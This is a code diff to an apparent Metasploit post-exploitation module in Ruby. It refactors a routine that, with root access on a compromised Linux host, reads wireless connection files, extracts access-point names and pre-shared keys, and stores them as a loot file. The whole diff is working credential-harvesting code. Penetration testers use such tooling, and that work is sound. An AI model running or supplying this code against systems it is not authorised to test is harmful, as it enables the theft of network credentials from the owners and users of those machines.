@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
   #
   # Extracts AccessPoint name and PSK
   #
-  def extract_secrets(data, ap_name)
+  def get_psk(data, ap_name)
     data.each_line do |l|
       if l =~ /^psk=/
         psk = l.split('=')[1].strip
@@ -51,27 +51,30 @@ class Metasploit3 < Msf::Post
     nil
   end
 
-  def run
-    if is_root?
-      tbl = Rex::Ui::Text::Table.new({
-        'Header'  => '802-11-wireless-security',
-        'Indent'  => 1,
-        'Columns' => ['AccessPoint Name', 'PSK']
-      })
-
-      files = cmd_exec("/bin/ls #{dir}").chomp.split
-      files.each do |l|
-        file = "#{dir}#{l}"
-        print_status("Reading file: #{file}")
-        # TODO: find better ruby way?
-        if data = read_file(file)
-          ret = extract_secrets(data, l)
-          if ret
-            tbl << ret
-          end
+  def extract_all_creds
+    tbl = Rex::Ui::Text::Table.new({
+      'Header'  => '802-11-wireless-security',
+      'Columns' => ['AccessPoint-Name', 'PSK'],
+      'Indent'  => 1,
+    })
+    files = cmd_exec("/bin/ls #{dir}").chomp.split
+    files.each do |f|
+      file = "#{dir}#{f}"
+      # TODO: find better (ruby) way
+      if data = read_file(file)
+        print_status("Reading file #{file}")
+        ret = get_psk(data, f)
+        if ret
+          tbl << ret
         end
       end
+    end
+    tbl
+  end
 
+  def run
+    if is_root?
+      tbl = extract_all_creds
       if tbl.rows.empty?
         print_status('No PSK has been found!')
       else
@@ -84,6 +87,9 @@ class Metasploit3 < Msf::Post
           tbl.to_csv,
           File.basename('wireless_credentials.txt')
         )
+        #tbl.rows.each do |cred|
+        #  report_auth_info()
+        #end
         print_good("Secrets stored in: #{p}")
       end
     else
